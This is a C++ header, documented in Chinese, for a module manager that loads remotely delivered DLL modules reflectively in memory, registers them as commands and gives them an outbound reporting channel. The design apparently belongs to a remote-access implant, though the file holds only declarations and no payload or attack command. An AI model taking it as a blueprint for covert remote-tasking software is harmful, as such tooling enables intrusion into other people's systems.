/**
 * @file ModuleManager.hpp
 * @brief 远程模块运行时管理器
 *
 * 负责模块的加载、卸载、状态查询（静态命令面 ModuleLoad/Unload/Status 的
 * handler 住 Handlers/ 目录, 注册点在 RegisterCore.hpp），
 * 以及已加载模块命令的动态注册、注销和分发包装。
 *
 * @section 职责边界
 * 本类只做模块运行时(生命周期/引用计数/CoreApi 回调表/上报通道); 命令面
 * 定义与静态注册归 Core/Command 层。唯一的例外是 ModuleExecHandler ——
 * 它随每次 Load() 动态创建、随 Unload() 注销, 生命周期与模块实例绑定,
 * 属运行时产物, 因此留在本文件而非 Handlers/ 目录。
 * 
 * @section 模块约定
 * @subsection 模块约定 v1 (C 风格跨 CRT 安全)
 * 反射加载的模块有自己一份 CRT，跨边界传递 C++ 对象会崩溃，
 * 一律使用 char* 传递数据：
 * @code
 * __declspec(dllexport) int __stdcall ModExec(const char* params_json, char* out, int out_size);
 * @endcode
 * 返回值：0 = 成功(out 为 JSON 响应字符串)；非 0 = 模块错误码。
 * 
 * @subsection 模块约定 v2
 * 可选导出 ModInit(const CleatCoreApi*) —— 核心注入回调表，
 * 模块可异步上报(api->send / send_binary / log)，支撑长任务/持续上报型模块。
 *
 * 可选导出 ModDeinit() —— 卸载钩子。核心在
 * DllMain(DETACH) 与 memset/VirtualFree 映像之前调用它；模块若自建了工作线程
 * (采集/钩子/reader)，必须在此停线程并等它们全部退出后再返回(返回非 0 仅告警)，
 * 否则线程会继续在已清零/已释放的映像上执行 → 崩溃或任意行为。
 * 注意: 模块线程不受 B1-1 引用计数保护，引用计数只覆盖在途 handler。
 * 
 * @section 命名约定
 * 命令名 = module_id(一个模块一个命令入口，模块内部按 params 分发子动作)。
 * 
 * @section 线程安全
 * 已加载模块用 shared_ptr 持有 —— 卸载与执行中命令并发安全(B1-1: 引用计数驱动释放)。
 */

#pragma once
#include <cstdint>
#include <functional>
#include <memory>
#include <mutex>
#include <string>
#include <unordered_map>
#include <vector>

#include "Common/Protocol/ModuleApi.hpp"
#include "Common/ThirdParty/json.hpp"
#include "Core/Loader/MemoryModule/IModuleLoader.hpp"

namespace cleat {

    class CommandDispatcher;   // 前向声明(P2.6 解环): 本头只用其引用/指针, 完整定义在 .cpp 取

    /**
     * @brief 模块管理器（单例模式）
     * 
     * 负责远程模块的动态加载、卸载、状态管理，以及命令的分发。
     * 提供模块上报通道和系统命令的实现。
     */
    class ModuleManager {
    public:
        static ModuleManager& Instance();

        /**
         * @brief 注入命令分发器(供 Load/Unload 动态注册/注销 module_id 命令)
         * @param dispatcher 命令分发器引用
         *
         * 静态命令面 ModuleLoad/Unload/Status 的注册已迁至
         * RegisterCore.hpp(核心层统一注册点); 本函数只保留 dispatcher 指针
         * 注入 —— 动态注册(每个已加载模块一个 ModuleExecHandler)仍归本管理器,
         * 那是运行时产物, 非静态命令面。在组合根调用一次。
         */
        void AttachDispatcher(CommandDispatcher& dispatcher);

        /**
         * @brief 注入出站发送通道
         * @param sender 发送函数，接受 vector<uint8_t> 返回 bool
         * 
         * 在组合根调用时注入，用于模块 api->send 的落地实现。
         */
        void SetDataSender(std::function<bool(const std::vector<uint8_t>&)> sender);

        /**
         * @brief 模块 API v3 只读查询的提供者
         * @details 三个量分属不同所有者: 会话 id → `ClientContext`; 代际() →
         *          `SessionRunner`; 链路状态 → `CommsManager`。注入而非硬连,
         *          模块侧因此不必再持有自己的 `ClientContext` 副本(N5)或硬编码 true(N8)。
         */
        struct RuntimeQueries {
            std::function<uint64_t()> session_id;
            std::function<uint64_t()> epoch;
            std::function<bool()> connected;
        };
        void SetRuntimeQueries(RuntimeQueries q);

        /**
         * @brief 取出进程内的 CoreApi 表(诊断与 ABI 断言用)
         * @details 表在进程内不可变且静态存储, 故返回裸指针安全; 模块拿到的就是这一张。
         */
        const CleatCoreApi* CoreApi() const;

        /**
         * @brief 加载模块
         * @param params 加载参数（包含 module_id、type、platform 等）
         * @param blob 模块字节数据
         * @return 响应JSON（包含加载结果和模块信息）
         * 
         * @note 系统命令实现，由 handler 调用。
         */
        nlohmann::json Load(const nlohmann::json& params, const std::vector<uint8_t>& blob);

        /**
         * @brief 卸载模块
         * @param params 卸载参数（包含 module_id）
         * @return 响应JSON（包含卸载结果）
         * 
         * @note 系统命令实现，由 handler 调用。
         */
        nlohmann::json Unload(const nlohmann::json& params);

        /**
         * @brief 查询模块状态
         * @param params 查询参数
         * @return 响应JSON（包含所有已加载模块的状态列表）
         * 
         * @note 系统命令实现，由 handler 调用。
         */
        nlohmann::json Status(const nlohmann::json& params) const;

        /**
         * @brief 退出清理
         * 
         * 在组合根 Shutdown 时调用，卸载所有已加载模块。
         */
        void UnloadAll();

        /**
         * @brief 模块上报通道
         * @param frame 要发送的数据帧
         * @return 发送是否成功
         * 
         * api 回调落地实现，线程安全。
         */
        bool SendFrame(std::vector<uint8_t> frame);

    private:
        /**
         * @brief 已加载模块条目
         */
        struct LoadedEntry {
            std::shared_ptr<LoadedModule> mod;      ///< 模块对象
            std::string command;                    ///< 注册的命令名(= module_id)
        };

        ModuleManager() = default;

        /// 模块加载器(AD10: 用 shared_ptr —— 模块删除器持有一份, 保证删除器执行时
        /// 加载器仍存活; 原 unique_ptr + 删除器捕获裸指针, 若最后一个模块引用晚于
        /// 本对象释放即悬垂)
        std::shared_ptr<IModuleLoader> loader_{ CreateModuleLoader() };
        CommandDispatcher* dispatcher_ = nullptr;                     ///< 命令分发器指针
        std::function<bool(const std::vector<uint8_t>&)> sender_;     ///< 数据发送函数
        std::unordered_map<std::string, LoadedEntry> modules_;         ///< 已加载模块映射
        mutable std::mutex mutex_;                                      ///< 互斥锁
    };

} // namespace cleat
